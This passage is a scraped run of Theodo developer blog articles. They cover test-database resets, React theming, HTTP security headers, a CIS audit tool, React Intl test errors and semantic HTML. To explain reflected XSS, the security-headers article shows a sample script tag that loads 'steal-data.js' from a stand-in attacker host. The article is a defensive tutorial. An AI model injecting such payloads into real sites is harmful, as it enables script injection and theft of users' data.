are available around my place so I usedJCDecaux APIfor a given station (you can get its ID on Citymapper for example):\nhttps://api.jcdecaux.com/vls/v1/stations/18047?contract=Paris&apiKey=token\nBut\u2026\nJCDecaux is no longer in charge of bike for hire service so you will get something like this:\n\r\n{\r\n  \"error\": \"Station not found\"\r\n}\r\n\nThe next company, Smovengo,is working on a upcoming API which will be available in a few weeks. Just be patient \nNext steps\nThis is the very first version of my smart mirror and here are the next updates to come:\n\nReal time traffic information for my roommate who is driving to work most of the time\nUse the new Velib API which will be available in a few weeks\nTranslate it to French because French people are bad at english \n\n \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJean-Philippe Dos Santos\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHaving independent functional tests is a good practice recommended by many developers. It allows you save a great deal of time; and it is well known, time is money!\nWhy\nIf your tests are not independent, it means that the execution of one test can impact the result of the following tests. Dependent tests can in fact fail randomly depending on the order of execution. \nI started working on a small project with a small amount of tests and I did not notice the problem at first. But as we added features, the number of tests increased significantly. And they started failing randomly. The bigger the project, the more difficult it is to understand why tests fail. We lost hours trying to find out the root cause of the failures. Indeed, the cause was not in the failing tests itself, but the failure was due to the execution of one test before. It thus took us a lot of time and energy to maintain our tests on a daily basis. \nTherefore, we decided to solve the problem and make our tests independent in a quick and simple way : reset the database between each test to make them start with a clean set of data. We set one constraint: to not impact the performances !\nLet\u2019s practice\nAs I mentioned before, in order to make our tests independent we chose to reset the database before each test using a dump\nfile. Here are the two main steps of the process:\n\n\nCreate an sql dump from your test database: To run your functional tests, you need to create a database. Right after this\nset up, create a dump of it :\n\n\nmysqldump -u $USER -h $HOST -p $PASSWORD $BDD_NAME > dump_db_test.sql\n\n\nReset your database before each test: Once the dump is created, we will use it to reset the database. You can create\nan AbstractBaseTestCase.php extending the \\PHPUnit_Framework_TestCase. Every functional test file should extend this file. In this file, create a setUp() method which will be run before each of your tests. This method will execute the command to reset the database with the dump file created before :\n\n\nabstract class AbstractBaseTestCase extends \\PHPUnit_Framework_TestCase\r\n    {\r\n        public function setUp()\r\n        {\r\n            $importCommand =\r\n        mysql -h mysqlHost -u mysqlUserName -p mysqlPassword mysqlDatabaseName < mysqlImportFilename;\r\n\r\n            exec($importCommand);\r\n        }\r\n    }\nBefore executing one functional test, this method is executed and it cleans the database. The following test then uses a new set of data and the previous modifications of the database do not impact the running test.\nGoing further\n\nAs you may have noticed, each time you\u2019re using a plaintext password in the command line, a warning is printed in the console.\nTo avoid this you can set up the password as an environment variable.\nExport MYSQL_PWD=\u2019mysqlPassword\u2019\n\nAs a quick solution, we decided to use the same database for each test. It is possible to improve this model and use fixtures\nto load before each test only the ones needed to run the tests.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSophie Moustard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs a web developer you may have already worked on a project where you had a single web application that was used by several different clients. The app would use a single code base but then it would need to have several variants, each personalized for a specific client:\n\nyou may need to change the look and feel of the app (turquoise color theme background instead of a red one, text aligned on the right instead of left, different fonts and illustrations)\nthe API calls you are making may vary depending on the client: each client could want to to have his own wording and you would need to fetch different i18n key-values depending on the client.\n\nImagine you develop a ticket selling platform and you offer a ticket selling app that is integrated in websites of your clients that include theaters, sports organisations and art galleries. You will most likely need to change the design and layout of the app for each of the clients so that it corresponds to the look and feel of their website.\nIn this article, I will show you how to have several personalized versions of your app while keeping a single code base.\n\nWe will begin with a simple ReactJS poll app styled using a styled-components theme.\nThen we will\u00a0create a second version of the app by adding another style theme and some structural differences.\nLastly we will configure the build so that we are able to switch between the two versions of the app.\n\nTo help you easily set up the project there is a companion repository.\nInitializing the project and creating a basic app\nStart by checking out the project and installing the required packages:\ngit clone https://github.com/invfo/theming-with-webpack.git\r\ncd theming-with-webpack\r\ngit checkout 514f5fd //checkout the commit pointing to the first version of the app\r\nnpm install\r\n  \nThen start the development server: npm start and go to http://localhost:8080 in the browser. You should see the following poll with two options and a submit button.\n\nCustomizing the app\nWe will now create a second version of this polling app.\nChanging the look and feel\nBegin by adding a second theme and a switch between two themes based on a THEME variable (which we will define later):\n// index.js\r\nconst advancedTheme = {\r\n  background: 'linear-gradient(#68C5DB, #E0CA3C)',\r\n  button: {\r\n    border: '3px black dotted',\r\n    borderRadius: '23px',\r\n    fontSize: '30px',\r\n    marginTop: '17px',\r\n    padding: '5px 10px',\r\n  },\r\n};\r\nconst theme = THEME === 'advanced' ? advancedTheme : basicTheme;\r\n  \nPass the new theme to the ThemeProvider:\n<ThemeProvider theme={theme}> // index.js\r\n  \nAdd a Title component and display it based on the THEME variable :\n// index.js\r\nconst Title = ({children}) => <h1>{children}</h1>\r\n\r\nclass App extends React.Component {\r\n  render() {\r\n    return (\r\n      <ThemeProvider theme={theme}>\r\n        <Wrapper>\r\n          { THEME === 'advanced' && <Title>Make your choice!</Title>}\r\n          ...\r\n  \nCheckout the corresponding commit in the companion repository to see other minor changes that should be made.\nSetting up the THEME variable\nTo be able to switch between the two app versions we need to define the THEME variable which we will wire to an environment variable of the same name.\nBegin by setting the THEME environment variable at build time and making it available in our app.\nAdd a build command for each app version. These commands will set the THEME environment variable to either red or blue :\n// package.json\r\n\"scripts\": {\r\n  \"start:basic\": \"cross-env THEME=basic webpack-dev-server\",\r\n  \"start:advanced\": \"cross-env THEME=advanced webpack-dev-server\"\r\n}\r\n  \nYou may wonder \u201c\u2019Cross-env\u2019? Why not simply use THEME=red webpack-dev-server?\u201d. This option would work fine on most OSs, but can be troublesome if you are using Windows.\nCross-env allows you to define environmental variables without worrying about particularities of the platform you are using. Install it: npm install --save-dev cross-env\nFinally let\u2019s put together everything we did in previous steps: make the THEME environment variable available in the app code\n// webpack.config.js\r\nplugins: [\r\n  new webpack.DefinePlugin({\r\n    THEME: JSON.stringify(process.env.THEME),\r\n  }),\r\n]\r\n  \nDefinePlugin enables you to create global constants that are configured during compilation. Here we\u2019re using it to define a THEME variable that is usable in our app\u2019s code. Its value will be equal to the THEME environment variable set using cross-env.\nFor more info see the official webpack doc.\nNow try out one of the new builds: npm run start:advanced\nYou should see the new version of the app:\n\n\n\nTo view the old version, run npm run start:simple\nYou can always get the latest app code version from the companion repository.\nTo sum up\nSo far we have learned how to:\n\nDefine your app\u2019s style and manage several CSS themes using styled-components and its ThemeProvider (check out the official docs for more information)\nSet up environment variables for the build using cross-env\nMake previously set environment variables available in your app\u2019s code using webpack\u2019s DefinePlugin\nModify app\u2019s content based on an environment variable value (on the example of <input>)\n\nUsing the above concepts you can personalize your ReactJS app and have several builds, each of them generating an app with a specific look.\nThe proposed method is suitable when the personalization you need to make:\n\nconcerns style or\nbasic html structure (like changing input types or adding / hiding certain elements).\n\nAs with any other concept, you should not blindly apply it on your project but rather ask yourself if this is the most suitable solution. The proposed way of personnalizing can be used when different app variants are quite similar. But if your app versions are totally different, having many if in your code will make it hard to maintain. In this case opt for another solution, for example having a separate \u201cmain\u201d file for each version.\nHave you already worked on a ReactJS app with several themes? How did you implement it?\nShare your experience in the comments below or simply let me know if you have any questions or remarks!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tDarya Talanina\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBy default, a lot of security flaws are introduced when you create a website. A few HTTP headers added in your web server configuration can prevent basic but powerful attacks on your website. If you really have only 5 minutes, you can skip to the end and copy-paste the few lines in your server configuration file. If you have a bit more time, you can go on and read what are these flaws and how you can protect your website from: clickjacking, MIME sniffing attack, Protocol downgrade attack, and reflective XSS.\nX-FRAME-OPTIONS\nA common threat to websites is clickjacking. A clickjacking attack wants to make you click wherever the attacker wants you to click. This type of attack was largely used on Facebook before they implemented the protection (see here).\nHow does it work?\nBasically, the attacker brings the user to a malicious page. However, the malicious page is hidden behind an innocent/trustworthy page, introduced in the malicious website with an iframe. The user is tricked into clicking on the regular page but he or she actually clicks on the malicious page. From this, the attacker can achieve whatever malicious action.\nBelow is an example, where a user is shown an interesting advertisement. While clicking on the button to enjoy the offer, the user will actually buy a car on eBay.\n\nYou can find more information here.\nHow to prevent clickjacking on your website ?\nThe X-FRAME-OPTIONS header tells the browser if another website can put your page in an iframe.\n\nSetting its value to DENY will tell the browser to never put your page into an iframe.\nSetting its value to SAMEORIGIN will tell the browser to never do it except where the host website is the same as the target website.\n\nIn most cases, you will want to add this line to your NGINX configuration file:\nadd_header X-Frame-Options \"DENY\";\r\n\nFor Apache web server you can add:\nHeader set X-FRAME-OPTIONS \"DENY\"\r\n\nX-Content-Type-Options\nSometimes, the browser tries to guess (or sniff) the type of an object (an image, a CSS file, a JavaScript file, etc). This can be used to make a browser execute some malicious JavaScript file. This issue was so important that Microsoft dedicated a security update for Internet Explorer 8 in part to it.\nHow does it work?\nWhen your browser loads a file, it reads the Content-Type header to determine which type it is. If you want to display an image on your webpage, you will generally write this in an HTML page:\n<img src=\"https://example.com/some-image\"></img>\r\n\nWhat if the some-image file is HTML instead? If your browser is MIME sniffing the file, it will inspect the content of this file, detect that this is HTML and render the HTML content, along with JavaScript included in the HTML. This means that a user can upload an image with HTML and JavaScript as the content, this JavaScript could be executed on any user displaying this fake image.\nYou can find more information here.\nHow to prevent MIME sniffing on your website?\nThe X-Content-Type-Options header tells the browser if it should sniff files or not.\nSetting its value to nosniff will tell the browser to never sniff the content of a file. The browser will only use a file if its Content-Type matches the HTML tag where it is used, and fail otherwise.\nHere is the line to add in your NGINX configuration file:\nadd_header X-Content-Type-Options \"nosniff\";\r\n\nFor Apache web server you can add:\nHeader set X-Content-Type-Options \"nosniff\"\r\n\nStrict-Transport-Security\nHTTPS is a great way to increase the security of your website and your users. However, it is possible to trick your users not to use HTTPS: once this is done, a malicious person can see what a user does on your website!\nHow does it work?\nIf you don\u2019t know yet, HTTPS is already a huge step towards improving the security of your website (if you want to include it on your website, I advise using Let\u2019s Encrypt). It prevents all the machines between your user and your server to see what is going on. It also guarantees that your users are talking to the correct website.\nHowever, when visiting a website, your browser will usually try to connect over HTTP, and once the server tells that it supports HTTPS, will upgrade to a secure connection. This represents an issue as a malicious person can intercept this insecure HTTP connection: it is known as a protocol downgrade attack.\nYou can find more information here.\nHow to prevent protocol downgrade attack on your website?\nThere are several ways to prevent this attack. As a user, you can install HTTPS everywhere (on Chrome or Firefox) which make your browser always try HTTPS first. But you can\u2019t force all your users to do this, fortunately, there is a server-side way.\nThe Strict-Transport-Security HTTP header (known as HSTS) tells the browser to connect directly with HTTPS to the website. This should be done through a redirection on your server from HTTP to HTTPS. A recommended lifetime for the HSTS header is 1 year and should include subdomains (see here).\nHere is the line to add in your NGINX configuration file:\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\";\r\n\nFor Apache web server you can add:\nHeader set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\r\n\nNB: This prevents the protocol downgrade attack on subsequent visits but not on the first one. You can visit the HSTS preload list website to see how you can prevent it on the first visit as well.\nX-XSS-Protection\nCross-site scripting (usually referred as XSS) is a way for a malicious person to take control of the page by injecting a script. If user content is wrongly injected into a website, an attacker can execute some script on your page, and from there do virtually everything.\nHow does it work?\nUsually, a website includes some user content. A messaging service displays the user messages.\nA search engine includes the search keywords on the page. The search keywords are also a part of the URL of the search engine. A search for theodo might look like this https://duckduckgo.com/?q=theodo.\nIf a malicious person searches for something like <script src=\"http://evil.example.com/steal-data.js\"></script>, then the URL will look like https://duckduckgo.com/?q=<script+src%3D\"http%3A%2F%2Fevil.example.com%2Fsteal-data.js\"><%2Fscript>. If the keywords are directly injected in the search page, it will show:\n\nAnd voil\u00e0, if someone tricks your users into going to the URL above, the malicious script is executed on your website on someone else\u2019s computer.\nYou can find more information here.\nHow to prevent reflected XSS on your website?\nThe best way to prevent reflected XSS is to escape all user input and to make sure to inject only trusted data in your website. Most modern frameworks do this, but this is sometimes impossible to do so. Another way is to say to the browser to not execute a script tag if it matches something in the query string. You can do this by adding the header X-XSS-Protection in the HTTP response and setting its value to 1; mode=block.\nHere is the line to add in your NGINX configuration file:\nadd_header X-XSS-Protection \"1; mode=block\";\r\n\nFor Apache web server you can add:\nHeader set X-XSS-Protection \"1; mode=block\"\r\n\nNB: this header actually causes more vulnerabilities on Internet Explorer 8 and older (less than 0.1% of market share). If you need to support these browsers you should disable this header when encountering these.\nExposing server information with Server and X-Powered-By\nBy default, NGINX and Apache display some information about the server (whether the web server is NGINX or Apache, the server version, perhaps the PHP version and the OS version).\nHiding this information will not prevent a hacker to exploit your server. However, it can direct the hacker to a particular set of attacks where your server is known to be vulnerable. These headers do not have a particular purpose and hiding them is nothing but benefitial.\nHere are the lines to add in your NGINX configuration file:\nserver_tokens off;\r\n\r\n// To be set in your proxy block\r\nproxy_hide_header X-Powered-By;\r\n\nFor Apache web server you can add:\nServerTokens Prod\r\n\nAnd for a PHP website served by Apache, add this in your PHP configuration file:\nexpose_php = Off\r\n\nTL;DR here are the lines you can add to your web server configuration file\nSetting a few HTTP headers on your web server can prevent some basic yet powerful attacks on your website. I advise you to do so for every website you own, where it is possible.\nFor NGINX, add these lines in the configuration file of your website:\nadd_header X-Frame-Options \"DENY\";\r\nadd_header X-Content-Type-Options \"nosniff\";\r\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\";\r\nadd_header X-XSS-Protection \"1; mode=block\";\r\nserver_tokens off;\r\n\r\n// To be set in your proxy block\r\nproxy_hide_header X-Powered-By;\r\n\nFor Apache, add these lines in the configuration file of your website:\nHeader set X-FRAME-OPTIONS \"DENY\"\r\nHeader set X-Content-Type-Options \"nosniff\"\r\nHeader set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\r\nHeader set X-XSS-Protection \"1; mode=block\"\r\nServerTokens Prod\r\n\nNB: if you use Expressjs, all these recommendations can be easily applied with the NPM package helmet. However, I recommend setting HTTP headers (and other concerns as compression and cache) on the web server side instead of Expressjs side because it is more efficient and improves the performance of your application.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Escolano\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTL;DR: try this security tool it\u2019s awesome.\nI was\u00a0looking for best practices to secure docker applications. One of those best pratices is to make sure the host is secured and well configured.\u00a0The main advice was\u00a0to read the best pratices from\u00a0the Center for Internet Security. This organisation\u00a0provides very actionnable recommandations on how to secure your OS.\u00a0It also\u00a0produces a very nice tool (which require java) that you run on the\u00a0server you want to\u00a0check.\u00a0This tool generates a\u00a0detailled report\u00a0describing\u00a0all the security flaws and their fixes.\nTesting\u00a0the CIS tool on your Vagrant\nYou can quickly test it\u00a0locally on your Vagrant\u00a0following those steps:\n\nInstall java on your Vagrant. If you use Ansible provisioning you can use this role\nAfter downloading the\u00a0tool,\u00a0extract the files and move it\u00a0to your Vagrant\nEnable the SSH X11 forwarding\u00a0for your Vagrant\nSSH into your vagrant and run the program.\u00a0If your server is a Linux one,\u00a0\u00a0run with sudo rights `CIS-CAT.sh`\nSelect \u201cserver 2\u201d option to have a complete report\n\nStart the check of the OS. You should see something like this:\n\nYou are done. To have an example of what you can get,\u00a0see the report I got for my side project. Here is the scoring part\u00a0of the report:\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy is it important?\nWhile programming on a project, you run your tests all the time, so it\u2019s important not to lose time analysing the results of your tests.\nWe want to immediatly spot which tests are failing, not being disturb by any flashing red false negative errors, which take all the place in your console and make you miss the important information.\nOn the project I\u2019m working on, the output of our tests was this kind of mess:\n\nThat\u2019s why we decided to create this standard on our project:\n\nIf my tests are passing, there must be no errors in the output of the test command\n\nSo we started to tackle this issue, and noticed that 100% of our errors in tests were either due to required props we forgot to pass to components, or errors from the React Intl library.\nI explain here how we managed to remove all these annoying React Intl errors from our tests:\n\nHow to avoid console errors from React-Intl?\nThe library complains that it does not know the translation for a message you want to render, because you did not pass them to the IntlProvider which wrap your components in your tests:\n\nconsole.error node_modules/react-intl/lib/index.js:706\n[React Intl] Missing message: \u201cLOGIN_USERNAME_LABEL\u201d for locale: \u201cen\u201d\nconsole.error node_modules/react-intl/lib/index.js:725\n[React Intl] Cannot format message: \u201cLOGIN_USERNAME_LABEL\u201d, using message id as fallback.\n\nThere are two ways to remove these errors.\n\n\nThe first one consists in explicitly giving the translations to the provider.\nIt has the benefit of writting the real translations in your shallowed components instead of the translation keys, which makes snapshots more readable.\nIt is easy to implement when you already have all your translations written in a file.\nHowever, it can be a bit tedious when your translations come from an API, because you have to update the list with the new translation every time you add a message.\n\n\nThe second solution works without having to update a list of translations, by automatically setting for every message a defaultMessage property equal to the message id.\nThis will not impact your snapshots: you will still have the message id and not its translation.\n\n\n1st solution: explicitly give the translations to your tests\n\nYou have to write all your translations in a JSON file, which looks like this:\n\n// tests/locales/en.json\r\n\r\n{\r\n  \"LOGIN_USERNAME_LABEL\": \"Username\",\r\n  \"LOGIN_PASSWORD_LABEL\": \"Password\",\r\n  \"LOGIN_BUTTON\": \"Login\",\r\n}\r\n\n\nEach time you mount or shallow a component, you should pass it as a messages props in the IntlProvider which wraps the component:\n\n// components/LoginButton/tests/LoginButton.test.js\r\n\r\nimport React from 'react';\r\nimport { IntlProvider } from 'react-intl';\r\n\r\nimport LoginButton from 'components/LoginButton';\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\nit('calls login function on click', () => {\r\n  const login = jest.fn();\r\n  const renderedLoginButton = mount(\r\n    <IntlProvider locale='en' messages={enTranslations}>\r\n      <LoginButton login={login} />\r\n    </IntlProvider>\r\n  );\r\n  renderedLoginButton.find('button').simulate('click');\r\n  expect(loginFunction.toHaveBeenCalled).toEqual(true);\r\n});\r\n\nBut actually, if you respect what is advised by React Intl documentation to shallow or mount components with Intl, you already have mountWithIntl and shallowWithIntl helper functions, and you pass your messages in the IntlProvider defined in these functions:\n// tests/helpers/intlHelpers.js\r\n\r\nimport React from 'react';\r\nimport { IntlProvider, intlShape } from 'react-intl';\r\nimport { mount, shallow } from 'enzyme';\r\n\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\n// You pass your translations here:\r\nconst intlProvider = new IntlProvider({\r\n    locale: 'en',\r\n    messages: enTranslations\r\n}, {});\r\n\r\nconst { intl } = intlProvider.getChildContext();\r\n\r\nfunction nodeWithIntlProp(node) {\r\n    return React.cloneElement(node, { intl });\r\n}\r\n\r\nexport function shallowWithIntl(node, { context } = {}) {\r\n    return shallow(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n        }\r\n    );\r\n}\r\n\r\nexport function mountWithIntl(node, { context, childContextTypes } = {}) {\r\n    return mount(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n            childContextTypes: Object.assign({},\r\n                { intl: intlShape },\r\n                childContextTypes\r\n            )\r\n        }\r\n    );\r\n}\r\n\nAnd you can use these functions instead of mount and shallow:\n// components/LoginButton/tests/LoginButton.test.js\r\n\r\nimport React from 'react';\r\n\r\nimport LoginButton from 'components/LoginButton';\r\nimport { mountWithIntl } from 'tests/helpers/intlHelpers';\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\nit('calls login function on click', () => {\r\n  const login = jest.fn();\r\n  const renderedLoginButton = mountWithIntl(<LoginButton login={login} />);\r\n  renderedLoginButton.find('button').simulate('click');\r\n  expect(loginFunction.toHaveBeenCalled).toEqual(true);\r\n});\r\n\n2nd solution: pass a customized intl object to your shallowed and mounted components\nUnlike the previous one, this solution works without having to update a list of translations, by using a customized intl object in your tests.\nCustomize the intl object\nThe idea is to modify the formatMessage method which is in the intl object passed to your component.\nYou have to make this formatMessage automatically add a defaultMessage property to a translation which does not already have one, setting its value the same as the translation id.\nIf we call originalIntl the intl object before customizing it, here is how you can do it:\nconst intl = {\r\n  ...originalIntl,\r\n  formatMessage: ({ id, defaultMessage }) =>\r\n    originalIntl.formatMessage({\r\n        id,\r\n        defaultMessage: defaultMessage || id\r\n    }),\r\n};\r\n\nHow to use this customized intl in your tests\nAs in the previous solution, we\u2019re going to modify the intlHelpers that React Intl documentation advise to use in tests.\nThe idea is to modify the two helper functions mountWithIntl and shallowWithIntl to give to the component our custom intl object instead of the original one.\nIn order to make the defaultMessage properties taken into account, you also have to give a defaultLocale props to the IntlProvider, with the same value as the locale props.\nHere is the modified intlHeplers file:\n// tests/helpers/intlHelpers.js\r\n\r\nimport React from 'react';\r\nimport { IntlProvider, intlShape } from 'react-intl';\r\nimport { mount, shallow } from 'enzyme';\r\n\r\nimport enTranslations from 'tests/locales/en.json';\r\n\r\n// You give the default locale here:\r\nconst intlProvider = new IntlProvider({\r\n    locale: 'en',\r\n    defaulLocale: 'en'\r\n}, {});\r\n\r\n// You customize the intl object here:\r\nconst { intl: originalIntl } = intlProvider.getChildContext();\r\nconst intl = {\r\n  ...originalIntl,\r\n  formatMessage: ({ id, defaultMessage }) =>\r\n    originalIntl.formatMessage({\r\n        id,\r\n        defaultMessage: defaultMessage || id\r\n    }),\r\n};\r\nfunction nodeWithIntlProp(node) {\r\n    return React.cloneElement(node, { intl });\r\n}\r\n\r\nexport function shallowWithIntl(node, { context } = {}) {\r\n    return shallow(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n        }\r\n    );\r\n}\r\n\r\nexport function mountWithIntl(node, { context, childContextTypes } = {}) {\r\n    return mount(\r\n        nodeWithIntlProp(node),\r\n        {\r\n            context: Object.assign({}, context, { intl }),\r\n            childContextTypes: Object.assign({},\r\n                { intl: intlShape },\r\n                childContextTypes\r\n            )\r\n        }\r\n    );\r\n}\r\n\nThen, you only have to use these functions instead of mount and shallow and all the warnings from React Intl will disappear from your shell.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYannick Wolff\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you ever used React you may have noticed that you can easily forget how to write a static webpage because it adds a layer of abstraction that changes the way the page is created. But in the end, all code written in JSX will generate a classic DOM. In this article I\u2019ll show you\u00a0mistakes I made and why it is important to write good HTML in Single Page Apps.\n\u00a0\nThe unresponsive file input\nContext\u00a0: Creating a button to upload files on a website.\nHow we did it:\nWe used a <input type=\"file\"> HTML input. Then we added an eventListener\u00a0 onChange\u00a0 which called a handleChange function \u00a0that adds the uploaded file as a base64 in component\u2019s state. Then, to delete it, we binded a function removeUploadedFile on click of a button and the file was removed from the list of uploaded file in the state. This is the natural \u201cReact way\u201d to create the feature.\n\r\nclass UploadButton extends Component {\r\n\u00a0\u00a0handleButtonCLick = () => {\r\n\u00a0\u00a0\u00a0\u00a0this.refs.fileUploader.click();\r\n\u00a0\u00a0}\r\n\u00a0\r\n\u00a0\u00a0handleChange = (event) => {\r\n\u00a0\u00a0\u00a0\u00a0this.props.handleFileUpload(event);\r\n\u00a0\u00a0}\r\n\u00a0\r\n\u00a0\u00a0render() {\r\n\u00a0\u00a0\u00a0\u00a0return (\r\n\u00a0\r\n      <div style={styles.container} onClick={this.handleButtonCLick} >\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<input type=\"file\" onChange={this.handleChange} style={styles.input} accept={acceptedFileTypesForUpload.join(',')} />\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<AddIcon color={COLORS.BLUE} style={styles.icon} />\r\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</div>\r\n\u00a0\r\n\u00a0\u00a0\u00a0\u00a0);\r\n\u00a0\u00a0}\r\n}\r\n\nWhat went wrong\u00a0:\nWe noticed that sometimes, uploading a document had no effect on our component\u2019s state. We had to spend some time to reproduce the bug\u00a0: It happened when we added a document, then immediately removed it and added it again. During the last step, the document was not added to the state.\nWhat happened :\nThe chosen implementation focuses only on the React mechanisms and does not take into account the underlying HTML. Indeed, any HTML input file has a value property associated with it that contains the information of the last document added in the input. But our implementation was only concerned with updating the React state of our component without taking care of this property.\nSo, when a document was removed, it was taken off the list in the state but not from the \u201cvalue\u201d property of the input. If we tried to add it again, the value parameter of the input did not change since the doc was already there and the onChange was not triggered.\n\r\nclass UploadButton extends Component {\u00a0\r\n\u00a0\u00a0handleChange = (event) => {\r\n\u00a0\u00a0\u00a0\u00a0this.props.handleFileUpload(event);\r\n    this.refs.fileUploader.value = ''; // this fixed the bug\r\n\n\u00a0\nEveryone hits Enter to submit a form\nContext\u00a0: An authentication form that is not submitted by pressing \u201cEnter\u201d key.\nHow we did it:\nWe used two TextField from the library MaterialUI to request username and password and a button to validate. The button had an onClick property that calls a function which triggers an API call to connect the user.\n\r\nrender() {\r\n    return (\r\n        <div>\r\n          <TextField\r\n              id=\"username\"\r\n          />\r\n          <TextField\r\n              id=\"password\"\r\n              type=\"password\"\r\n          />\r\n          <button onClick={this.submitForm}>\r\n              Submit\r\n          </button>\r\n        </div>\r\n    );\r\n}\r\n\nWhat happened :\nHere too, \u00a0using functions of React component called through event listener bypassed the usual way in which a form must be built in HTML ie with <form> tags and a <input type=submit> in the end. This was the right way to create our login form :\n\r\nrender() {\r\n    return (\r\n        <form onSubmit={this.submitForm}>\r\n            <TextField\r\n                id=\"text-field-default\"\r\n                defaultValue=\"Default Value\"\r\n            />\r\n            <input type=\"submit\" value=\"Submit\" />\r\n        </form>\r\n    );\r\n}\r\n\nThus usual features (such as validation with input) are missing. It is possible to reinvent them for example with a KeyEventListener here, but what is the point then\u00a0?\n\u00a0\nKeep the web semantic!\nContext\u00a0: Reproduce a button by adding an onClick property on a div for example\nThe problem that arises in this case is that the semantic web is not respected. The semantic web is a set of standards that allow search engines to transform textual information (HTML pages) into machine-readable data.\nIn this context a <div> tag will be interpreted as an element that contains information and not as an interface element. Thus, using a div tag as a button distorts search engine interpretation and therefore SEO.\nHere are some examples of what you should and shouldn\u2019t do:\n\r\n\u274c <div onClick=\"function\">Button</div>\r\n\u2705 <button onClick=\"function\">Button</button>\r\n\r\n\u274c <div onClick=\"function\">Link</div>\r\n\u2705 <a href=\"link\">Link</a>\r\n\r\n\u274c <div style=\"list\">\r\n    <div style=\"list-elem\">1</div>\r\n    <div style=\"list-elem\">2</div>\r\n   </div>\r\n\u2705 <ul style=\"list\">\r\n    <li style=\"list-elem\">1</li>\r\n    <li style=\"list-elem\">2</li>\r\n   </ul>\r\n\nAn other frequent mistake comes from the React obligation to enclose components in a unique HTML tag. <div> tags are often added to the DOM structure for no other reason. To prevent that, React introduced Fragments in version v16.2.0. These allow to group many childs in a component without adding an extra tag :\n\r\nrender() {\r\n  return (\r\n    <React.Fragment>\r\n      <li />\r\n      <li />\r\n      <li />\r\n    </React.Fragment>\r\n  